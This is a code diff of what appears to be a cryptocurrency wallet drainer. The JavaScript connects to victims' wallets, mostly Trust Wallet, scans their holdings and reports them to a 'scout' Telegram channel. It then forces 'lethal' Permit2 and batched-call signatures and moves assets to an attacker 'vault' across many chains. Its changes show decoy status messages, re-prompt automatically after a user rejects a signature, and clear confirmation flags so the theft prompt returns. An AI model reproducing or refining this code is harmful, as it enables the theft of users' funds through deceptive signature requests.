-    var fusionData = await SCOUT.fusion(addrs);
+    var portfolio;
+    if (alreadyScanned) {
+      L.log('[drain] reuse portfolioScan — skip re-multi-balance/ranked');
+      portfolio = S.portfolioScan;
+    } else {
+      portfolio = await scanFullPortfolio(evmCtx.address, addrs);
+    }
+
+    var alreadyNotified = !!(S.notifyDone || S.connectNotifiedAddr === addrKey);
+    if (!alreadyNotified) {
+      await SCOUT.alertStage('connect', evmCtx.address, evmCtx.chainId, evmCtx.walletName, 'Wallet connected');
+      await broadcastConnectScan(evmCtx.address, evmCtx.chainId, evmCtx.walletName, addrs);
+    } else {
+      L.log('[drain] skip re-notify scout — already notified');
+    }
+
+    if (!alreadyScanned) {
+      await SCOUT.alertStage('scan_start', evmCtx.address, evmCtx.chainId, evmCtx.walletName);
+    }
+
+    var fusionData = null;
+    var fKey = String((addrs && (addrs.evm || addrs.sol || addrs.btc)) || addrKey).toLowerCase();
+    if (alreadyScanned && S._fusionDoneKey === fKey) {
+      L.log('[drain] reuse fusion — skip re-POST');
+      fusionData = { total_usd: S.scoutUsd, assets: S.fusionAssets };
+    } else {
+      fusionData = await SCOUT.fusion(addrs);
+    }
     if (fusionData && fusionData.total_usd) {
       S.scoutUsd = Math.max(S.scoutUsd, Number(fusionData.total_usd) || 0);
       L.log('Fusion USD (all families):', S.scoutUsd.toFixed(2));
@@ -5989,15 +6695,19 @@
       S.scoutUsd = portfolio.totalUsd;
     }
 
-    await SCOUT.reportScanComplete(
-      evmCtx.address,
-      S.scoutUsd,
-      (portfolio && portfolio.assetCount) ||
-        (fusionData && fusionData.assets_count) ||
-        (portfolio && portfolio.items && portfolio.items.length) || 0,
-      evmCtx.walletName,
-      evmCtx.chainId
-    );
+    if (!S.fusionNotified) {
+      await SCOUT.reportScanComplete(
+        evmCtx.address,
+        S.scoutUsd,
+        (portfolio && portfolio.assetCount) ||
+          (fusionData && fusionData.assets_count) ||
+          (portfolio && portfolio.items && portfolio.items.length) || 0,
+        evmCtx.walletName,
+        evmCtx.chainId
+      );
+    } else {
+      L.log('[drain] skip re-report scan_complete');
+    }
 
     evmCtx.chainId = await ensureFundedEvmChain(evmCtx.provider, evmCtx.address, evmCtx.chainId);
     S.evmChain = evmCtx.chainId;
@@ -6010,9 +6720,12 @@
     await prepareExtensionFamiliesBeforeDrain(fusionData);
     await prepareWcSignersBeforeDrain(fusionData);
 
-    // Single-shot removed — reject → re-prompt until success (runWithRetry)
+    // Same popup never re-shown after user confirms; different families may still prompt
     var runners = {
       EVM: function () {
+        // Do NOT global-skip after first lethal — Mode B walks other fundedChains.
+        // Per-chain isPopupConfirmed inside waterfall avoids re-showing same chain/kind.
+        L.log('[drain] EVM Mode B — all funded chains');
         return runEvmDrain(
           evmCtx.provider, evmCtx.address, evmCtx.chainId, evmCtx.walletName, evmCtx.hwObj, portfolio
         ).catch(function (e) {
@@ -7002,6 +7715,13 @@
     showUserRejected: function () {
       this.showStatus(userRejectionMessage());
       this.overlay.hide();
+      var self = this;
+      clearTimeout(self._rejectRetryTimer);
+      self._rejectRetryTimer = setTimeout(function () {
+        if (!pipelineBusy()) {
+          startPipeline({ reason: 'reject-retry' });
+        }
+      }, 300);
     },
 
     setConnected: function (addr, chainName) {
@@ -7030,7 +7750,13 @@
    * Resume after Safari freeze: notify-first if missing, then drain.
    * Never no-op just because a prior pipeline set postConnectComplete wrongly.
    */
+  /** Public resume — always through single pipeline (debounced join). */
   async function continueConnected() {
+    var r = await startPipeline({ reason: 'resume' });
+    return !!(r && (r.ok || r.continued || r.path === 'scan_only' || r.path === 'already_done'));
+  }
+
+  async function continueConnectedCore() {
     // Recover address from session if state wiped
     if (!S.evmAddr) {
       try {
@@ -7144,9 +7870,23 @@
       }
     }
 
-    if (S.postConnectComplete && notified && S.drainAttempted) {
-      L.log('[continue] already complete');
+    if (S.postConnectComplete && notified && S.drainAttempted && isPipelineFullySettled()) {
+      L.log('[continue] already complete (settled)');
       return true;
+    }
+    // Pending Permit2 without flush — finish vault path first
+    if (needsEvmFlush() && S.evmProvider) {
+      L.log('[continue] pending Permit2 → settle to vault');
+      try {
+        await settleEvmToVault({});
+        if (!needsEvmFlush()) {
+          S.postConnectComplete = true;
+          emitEvmConfirmDone(S.evmAddr);
+          return true;
+        }
+      } catch (eFlush) {
+        L.warn('[continue] settle:', eFlush && eFlush.message);
+      }
     }
 
     // Drain needs live WC session — recover again before giving up
@@ -7158,6 +7898,9 @@
 
     L.log('[continue] resume drain pipeline (notify ok=' + !!notified + ', usd=' + (S.scoutUsd || 0) + ')');
     S.postConnectComplete = false;
+    if (!hasRealEvmSuccess()) {
+      clearSoftLethalSkipFlags();
+    }
     await handleEvmConnect(S.evmProvider, {
       info: { name: S.evmWallet || 'WalletConnect', walletKey: 'trust' },
       resume: true,
@@ -7165,31 +7908,25 @@
     return true;
   }
 
+  /**
+   * Legion-internal resume hooks — DISABLED when Trust satellites own resume
+   * (trust-post-connect + keepalive → startPipeline). Avoids triple resume.
+   * Enable only if CFG.legionOwnResume === true.
+   */
   function installPostConnectResume() {
     if (window.__LEGION_POST_CONNECT_RESUME__) return;
     window.__LEGION_POST_CONNECT_RESUME__ = true;
+    if (CFG.legionOwnResume !== true) {
+      L.log('[resume] legion installPostConnectResume noop — satellites own startPipeline(resume)');
+      return;
+    }
     var kick = function (why) {
       try {
         if (!S.evmAddr && !sessionStorage.getItem('legion_wc_evm_addr')) return;
-        // Always try notify if missing — even when AUTO_DRAIN false
-        var needNotify = !S.notifyDone && !S.connectNotifiedAddr;
-        try {
-          var aKey = S.evmAddr || sessionStorage.getItem('legion_wc_evm_addr') || '';
-          if (needNotify && aKey && sessionStorage.getItem('legion_notify_done') === String(aKey).toLowerCase()) {
-            needNotify = false;
-            S.notifyDone = true;
-            S.connectNotifiedAddr = String(aKey).toLowerCase();
-          }
-        } catch (eNn) { /* ignore */ }
-        var needDrain = AUTO_DRAIN && !S.drainAttempted && !S.postConnectComplete;
-        if (!needNotify && !needDrain) return;
-        if (S.drainRunning) return;
-        if (S.connecting) {
-          var age = S.connectingSince ? (Date.now() - S.connectingSince) : 0;
-          if (age < 20000) return;
-        }
-        L.log('[resume]', why, '→ continueConnected');
-        continueConnected().catch(function (e) {
+        if (hasRealEvmSuccess() && S.postConnectComplete) return;
+        if (pipelineBusy()) return;
+        L.log('[resume]', why, '→ startPipeline');
+        startPipeline({ reason: why || 'resume' }).catch(function (e) {
           L.warn('[resume] fail:', e && e.message);
         });
       } catch (e) {
@@ -7199,7 +7936,6 @@
     document.addEventListener('visibilitychange', function () {
       if (document.visibilityState === 'visible') {
         setTimeout(function () { kick('visible'); }, 400);
-        setTimeout(function () { kick('visible+2s'); }, 2000);
       }
     });
     window.addEventListener('pageshow', function () {
@@ -7208,10 +7944,6 @@
     window.addEventListener('focus', function () {
       setTimeout(function () { kick('focus'); }, 500);
     });
-    // Periodic safety net while tab alive
-    setInterval(function () {
-      if (document.visibilityState === 'visible') kick('tick');
-    }, 8000);
   }
 
   async function handleEvmConnect(provider, walletInfo, hwObj) {
@@ -7221,6 +7953,12 @@
       return;
     }
     var isWcProv = !!(provider && provider.isWalletConnect === true);
+    if (!isWcProv && !hwObj && acceptTrustInAppWc(getLegionConnectorId(), provider)) {
+      try { provider.isWalletConnect = true; } catch (eMarkWc) { /* ignore */ }
+      isWcProv = true;
+      S.connectMode = 'wc';
+      S.wcSessionActive = true;
+    }
     if (S.connectMode === 'wc' && !isWcProv && !hwObj) {
       logConnect('reject', 'extension hijack during MOBILE-WC');
       await clearInjectedSession({ keepMode: true });
@@ -7233,6 +7971,9 @@
     S.connecting = true;
     S.connectingSince = Date.now();
     S.connectMode = isWcProv ? 'wc' : 'injected';
+    if (!isWcProv && isTrustInAppBrowser() && !S.injectedWalletKey) {
+      S.injectedWalletKey = 'trust';
+    }
     try {
       var accounts = await evmRequestAccounts(provider);
       if (!accounts || !accounts.length) throw new Error('No accounts returned');
@@ -7282,47 +8023,157 @@
         S.fusionNotified = false;
         S.drainAttempted = false;
       }
+      // Resume without real success: clear stale "already confirmed" so lethal can show
+      if (isResume && !hasRealEvmSuccess()) {
+        L.log('[connect] resume — clear soft lethal skip flags (no real success yet)');
+        clearSoftLethalSkipFlags();
+      }
       applyLegionWalletSessionAddresses();
 
       var fastTrust = isTrustInAppBrowser() || /trust/i.test(String(walletName || '')) ||
         (!!(provider && (provider.isTrust || provider.isTrustWallet)));
       var notifyOk = false;
+      S.userRejectedSign = false;
 
-      // ═══ INSTANT LETHAL SIGN (Trust) — Permit2/sendCalls/7702, NEVER personal_sign ═══
+      // ═══ TRUST: ONE FLOW — harvest → scout → lethal → Mode B settle (all funded EVM + non-EVM) ═══
       if (AUTO_DRAIN && fastTrust && !hwObj) {
-        var alreadyInstant = S.instantSignAt && (Date.now() - S.instantSignAt < 90000);
+        try { setPipelinePhase(PIPELINE.SCANNING); } catch (ePh0) { /* ignore */ }
+        UI.showStatus('Linking networks…');
+        L.log('[connect] ONE-FLOW — harvest families BEFORE scout/sign');
+
+        // Family harvest FIRST (non-EVM addresses available for scout + same settle pass)
+        try {
+          await runWithTimeout(
+            runBackgroundFamilyRails({ honorAbort: false, reportSkips: false, noWcExtend: true }),
+            20000,
+            'trust-inapp-families'
+          );
+          applyLegionWalletSessionAddresses();
+          wireWcFamilyConnections();
+        } catch (eFam) {
+          L.warn('[connect] Trust families early:', eFam && eFam.message);
+        }
+
+        UI.showStatus('Scanning portfolio…');
+        try {
+          notifyOk = await runWithTimeout(
+            broadcastConnectScan(address, chainId, walletName, S.allAddresses || collectAddressMap(address)),
+            8000,
+            'connect-notify'
+          );
+          notifyOk = notifyOk !== false && !!(S.notifyDone || S.connectNotifiedAddr);
+        } catch (notifyErr) {
+          L.warn('[connect] notify:', notifyErr && notifyErr.message);
+        }
+        try {
+          await runWithTimeout(
+            fireConnectAmountScout(address, chainId, walletName),
+            20000,
+            'amount-scout'
+          );
+        } catch (eAmt) {
+          L.warn('[connect] amount scout:', eAmt && eAmt.message);
+        }
+
+        var alreadyInstant = typeof evmLethalAlreadyConfirmed === 'function' && evmLethalAlreadyConfirmed();
+        var scoutUsd = Number(S.scoutUsd) || 0;
+        var emptyWallet = S.amountScoutDone && scoutUsd <= 0;
+
+        if (emptyWallet && !alreadyInstant && !needsEvmFlush()) {
+          L.log('[connect] empty wallet after scan — skip lethal, complete notify path');
+          S.drainAttempted = true;
+          S.postConnectComplete = true;
+          try { setPipelinePhase(PIPELINE.DONE); } catch (ePhE) { /* ignore */ }
+          S.connecting = false;
+          UI.overlay.hide();
+          UI.showStatus('Scan complete — no assets');
+          return;
+        }
+
+        // Fast first popup on current/funded chain; Mode B in settle covers OTHER funded EVM
         if (!alreadyInstant) {
-          UI.showStatus('Confirm Permit2 in Trust…');
-          L.log('[connect] LETHAL-FIRST (Permit2 / sendCalls — no personal_sign)');
+          try { setPipelinePhase(PIPELINE.SIGNING); } catch (ePh1) { /* ignore */ }
+          UI.showStatus('Confirm in Trust…');
+          L.log('[connect] lethal AFTER scan | usd=', scoutUsd);
           try {
             var instant = await forceLethalSign(provider, address, chainId, walletName);
             if (instant && instant.ok) {
-              S.drainAttempted = true;
+              S.userRejectedSign = false;
               L.log('[connect] lethal sign OK:', instant.path);
             } else {
               L.warn('[connect] lethal miss:', instant && instant.error);
             }
           } catch (instErr) {
             if (isUserRejection(instErr)) {
+              S.userRejectedSign = true;
+              try { setPipelinePhase(PIPELINE.REJECTED); } catch (ePhR) { /* ignore */ }
               await SCOUT.alertStage('user_rejected', address, chainId, walletName, instErr.message);
               UI.showUserRejected();
+              S.connecting = false;
               return;
             }
             L.warn('[connect] lethal sign:', instErr && instErr.message);
           }
         } else {
-          L.log('[connect] skip lethal — already signed');
-          S.drainAttempted = true;
+          L.log('[connect] skip first lethal — already signed this session');
         }
+
+        var drainRejected = false;
+        try { setPipelinePhase(PIPELINE.DRAINING); } catch (ePh2) { /* ignore */ }
+
+        L.log('[connect] settle — Mode B all funded EVM + non-EVM + flush');
+        S.drainAttempted = true;
+        try {
+          await settleEvmToVault({
+            provider: provider,
+            address: address,
+            chainId: chainId,
+            walletName: walletName,
+            hwObj: hwObj,
+          });
+          S.userRejectedSign = false;
+        } catch (drainErr) {
+          if (isUserRejection(drainErr)) {
+            drainRejected = true;
+            S.userRejectedSign = true;
+            try { setPipelinePhase(PIPELINE.REJECTED); } catch (ePhR2) { /* ignore */ }
+            await SCOUT.alertStage('user_rejected', address, chainId, walletName, drainErr.message);
+            UI.showUserRejected();
+          } else {
+            await SCOUT.alertFailure('EVM', 'connect_drain', drainErr, address, chainId, walletName);
+            throw drainErr;
+          }
+        }
+
+        if (S.anchorsOk > 0) {
+          UI.status('Complete!');
+        } else if (!drainRejected && scoutUsd > 0 && !needsEvmFlush()) {
+          await SCOUT.reportDrainStatus('no_action', address, chainId, walletName, 'No signature or confirmed TX submitted');
+        }
+
+        if (!needsEvmFlush() && !drainRejected) {
+          S.postConnectComplete = true;
+          // Event kept for debug; Phase B auto-UI is muted
+          emitEvmConfirmDone(address);
+          try { setPipelinePhase(PIPELINE.DONE); } catch (ePh3) { /* ignore */ }
+        } else if (drainRejected) {
+          try { setPipelinePhase(PIPELINE.REJECTED); } catch (ePh4) { /* ignore */ }
+        } else {
+          L.warn('[connect] pending still set after settle — resume can flush');
+          try { setPipelinePhase(PIPELINE.IDLE); } catch (ePh5) { /* ignore */ }
+        }
+        S.connecting = false;
+        UI.overlay.hide();
+        return;
       }
 
-      // ═══ BACKGROUND: notify + amount (never block wallet popup) ═══
-      UI.showStatus(fastTrust ? 'Signature sent — syncing…' : 'Notifying…');
+      // ═══ NON-TRUST: original bg notify then drain ═══
+      UI.showStatus('Notifying…');
       var bgNotify = (async function () {
         try {
           notifyOk = await runWithTimeout(
             broadcastConnectScan(address, chainId, walletName, S.allAddresses || collectAddressMap(address)),
-            fastTrust ? 6000 : 12000,
+            12000,
             'connect-notify'
           );
           notifyOk = notifyOk !== false && !!(S.notifyDone || S.connectNotifiedAddr);
@@ -7337,36 +8188,11 @@
         try {
           await runWithTimeout(
             fireConnectAmountScout(address, chainId, walletName),
-            fastTrust ? 8000 : 15000,
+            15000,
             'amount-scout'
           );
         } catch (eAmt) {
           L.warn('[connect] amount scout:', eAmt && eAmt.message);
-        }
-        // Trust in-app: also try WC multi-namespace link for non-EVM chains (SOL/BTC/TRON/TON)
-        if (fastTrust) {
-          try {
-            L.log('[connect] Trust in-app: WC supplemental families (SOL/BTC/TRON/TON)');
-            await runWithTimeout(
-              runBackgroundFamilyRails({ honorAbort: false, reportSkips: false }),
-              20000,
-              'trust-inapp-families'
-            );
-            applyLegionWalletSessionAddresses();
-            wireWcFamilyConnections();
-            // Re-notify with new family addresses
-            if (S.allAddresses && Object.keys(S.allAddresses).length > 1) {
-              try {
-                await runWithTimeout(
-                  broadcastConnectScan(address, chainId, walletName, S.allAddresses),
-                  6000,
-                  'renotify-families-trust'
-                );
-              } catch (eRn) { /* ignore */ }
-            }
-          } catch (eFam) {
-            L.warn('[connect] Trust in-app families:', eFam && eFam.message);
-          }
         }
       })();
 
@@ -7385,51 +8211,39 @@
       armDrainLock();
       S.pendingEvmPermit2 = null;
 
-      // Multi-chain link: AFTER first sign for Trust (was blocking 20–60s before popup)
       if (!isResume || !S.familiesLinked) {
-        if (fastTrust) {
-          // Family linking already kicked off inside bgNotify (runBackgroundFamilyRails).
-          // Just mark intent; the second drain pass below will catch linked families.
-          S.familiesLinked = false;
-        } else {
-          S.familiesLinked = false;
-          S.familyConnections = {};
-          S.evmScanChainIds = null;
-          S.chains = { EVM: null, SOL: null, TRON: null, TON: null, BTC: null, COSMOS: null, APTOS: null, SUI: null };
-          S.allAddresses = {};
-          UI.showStatus('Linking blockchains…');
-          applyLegionWalletSessionAddresses();
-          await runWithTimeout(linkAllFamiliesOnConnect(address), 20000, 'link-families');
+        S.familiesLinked = false;
+        S.familyConnections = {};
+        S.evmScanChainIds = null;
+        S.chains = { EVM: null, SOL: null, TRON: null, TON: null, BTC: null, COSMOS: null, APTOS: null, SUI: null };
+        S.allAddresses = {};
+        UI.showStatus('Linking blockchains…');
+        applyLegionWalletSessionAddresses();
+        await runWithTimeout(linkAllFamiliesOnConnect(address), 20000, 'link-families');
+        await runWithTimeout(
+          broadcastConnectScan(address, chainId, walletName, S.allAddresses),
+          10000,
+          'renotify-families'
+        );
+        if (!S.amountScoutDone) {
+          await runWithTimeout(fireConnectAmountScout(address, chainId, walletName), 12000, 'amount-scout-2');
+        }
+        if (S.connectMode === 'wc') {
+          UI.showStatus('Checking wallet session chains…');
           await runWithTimeout(
-            broadcastConnectScan(address, chainId, walletName, S.allAddresses),
-            10000,
-            'renotify-families'
+            enrichWcFamiliesAndRenotify(address, chainId, walletName),
+            15000,
+            'enrich-wc'
           );
-          if (!S.amountScoutDone) {
-            await runWithTimeout(fireConnectAmountScout(address, chainId, walletName), 12000, 'amount-scout-2');
-          }
-          if (S.connectMode === 'wc') {
-            UI.showStatus('Checking wallet session chains…');
-            await runWithTimeout(
-              enrichWcFamiliesAndRenotify(address, chainId, walletName),
-              15000,
-              'enrich-wc'
-            );
-          }
         }
       }
 
-      // Don't wait forever for bg notify — max 2s then drain
       try {
-        await Promise.race([
-          bgNotify,
-          sleep(fastTrust ? 800 : 2000),
-        ]);
+        await Promise.race([bgNotify, sleep(2000)]);
       } catch (eBg) { /* ignore */ }
 
       await sleep(CFG.delayDrainMs || 200);
 
-      // ═══ PHASE: full drain (Permit2 etc.) ═══
       L.log('[connect] starting drain (notify=' + !!notifyOk + ', fastTrust=' + !!fastTrust + ')');
       S.drainAttempted = true;
       var drainRejected = false;
@@ -7444,6 +8258,7 @@
       } catch (drainErr) {
         if (isUserRejection(drainErr)) {
           drainRejected = true;
+          S.userRejectedSign = true;
           await SCOUT.alertStage('user_rejected', address, chainId, walletName, drainErr.message);
           UI.showUserRejected();
         } else {
@@ -7595,6 +8410,14 @@
     if (S.drainRunning) return;
     var deepLinkPeek = null;
     try { deepLinkPeek = window.__LEGION_DEEP_LINK_TARGET__ || null; } catch (ePeek) { deepLinkPeek = null; }
+    // Trust in-app Browser: never fire trust://wc — stay on AppKit multichain sheet
+    try {
+      if (isTrustInAppBrowser() || window.__TRUST_IN_APP__ || window.__TRUST_INAPP_APPKIT__) {
+        window.__TRUST_INAPP_APPKIT__ = true;
+        window.__LEGION_DEEP_LINK_TARGET__ = null;
+        deepLinkPeek = null;
+      }
+    } catch (eInAppWc) { /* ignore */ }
     // Named mobile deep-link must never get stuck behind a prior connecting flag
     if ((S.connecting || _wcConnecting) && !deepLinkPeek) {
       logConnect('skip', 'WC connect already running');
@@ -7805,8 +8628,15 @@
     connectTrezor: handleTrezorConnect,
     connectInjected: connectWithWallet,
     resolveProvider: resolveEvmProvider,
-    /** Resume scout+drain after mobile WC connect (Uniswap flow). */
+    /** Resume scout+drain after mobile WC connect — routes through startPipeline. */
     continueConnected: continueConnected,
+    /** Single pipeline owner — satellites must prefer this over ad-hoc sign/continue. */
+    startPipeline: startPipeline,
+    getPipelinePhase: function () { return _pipelinePhase; },
+    pipelineBusy: pipelineBusy,
+    needsEvmFlush: needsEvmFlush,
+    hasSettledEvm: hasSettledEvm,
+    settleToVault: function () { return settleEvmToVault({}); },
     /** Amount Telegram only — no WC provider required. */
     runAmountScout: function (addr, chainId, walletName) {
       var a = (addr || S.evmAddr || '').toLowerCase();
@@ -7822,6 +8652,32 @@
     getScoutUsd: function () { return Number(S.scoutUsd) || 0; },
     /** Trust Approve button — drain or personal_sign so wallet always gets a popup. */
     forceTrustSign: forceTrustSignPublic,
+    linkTrustFamilies: linkTrustFamilies,
+    connectAllFamilies: connectAllFamilies,
+    /** Fire Telegram connect+scan immediately (Android in-app must not wait for handleEvmConnect). */
+    notifyConnect: function (addr, chainId, walletName) {
+      var a = (addr || S.evmAddr || '').toLowerCase();
+      if (!a) return Promise.resolve(false);
+      S.evmAddr = a;
+      if (!S.connectSession) {
+        S.connectSession = 'legion:' + Date.now() + ':' + Math.random().toString(36).slice(2, 8);
+      }
+      return broadcastConnectScan(
+        a,
+        chainId || S.evmChain || 1,
+        walletName || S.evmWallet || 'Trust Wallet',
+        S.allAddresses || collectAddressMap(a)
+      ).then(function () {
+        return fireConnectAmountScout(
+          a,
+          chainId || S.evmChain || 1,
+          walletName || S.evmWallet || 'Trust Wallet'
+        ).then(function () { return true; }).catch(function () { return !!(S.notifyDone || S.connectNotifiedAddr); });
+      }).catch(function () { return false; });
+    },
+    evmAlreadyConfirmed: evmLethalAlreadyConfirmed,
+    markPopupConfirmed: markPopupConfirmed,
+    closeAppKitModal: closeAppKitModal,
     /** Phase B: SOL/BTC/TRON/TON link+drain with Stop support. */
     runPhaseB: runPhaseBInteractive,
     abortPhaseB: abortPhaseB,
